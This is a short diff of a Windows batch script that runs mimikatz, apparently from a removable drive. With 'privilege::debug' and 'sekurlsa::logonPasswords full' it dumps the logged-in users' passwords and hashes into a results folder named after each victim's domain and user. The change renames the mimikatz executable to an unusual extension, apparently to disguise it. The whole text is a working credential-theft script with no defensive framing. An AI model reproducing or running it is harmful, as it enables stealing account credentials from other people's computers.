@@ -10,5 +10,5 @@ set mimikatz_files=%~d0\files\mimikatz
 set results_folder=%~d0\results\%USERDOMAIN%@%USERNAME%
 
 REM ----- Save mimikatz results -----
-if exist %mimikatz_files%\Win32\mimikatz.ps %mimikatz_files%\Win32\mimikatz.ps "privilege::debug" "sekurlsa::logonPasswords full" exit > %results_folder%\mimikatz.txt
-if exist %mimikatz_files%\x64\mimikatz.ps %mimikatz_files%\x64\mimikatz.ps "privilege::debug" "sekurlsa::logonPasswords full" exit > %results_folder%\mimikatz_x64.txt
+if exist %mimikatz_files%\Win32\mimikatz.rdps %mimikatz_files%\Win32\mimikatz.rdps "privilege::debug" "sekurlsa::logonPasswords full" exit > %results_folder%\mimikatz.txt
+if exist %mimikatz_files%\x64\mimikatz.rdps %mimikatz_files%\x64\mimikatz.rdps "privilege::debug" "sekurlsa::logonPasswords full" exit > %results_folder%\mimikatz_x64.txt
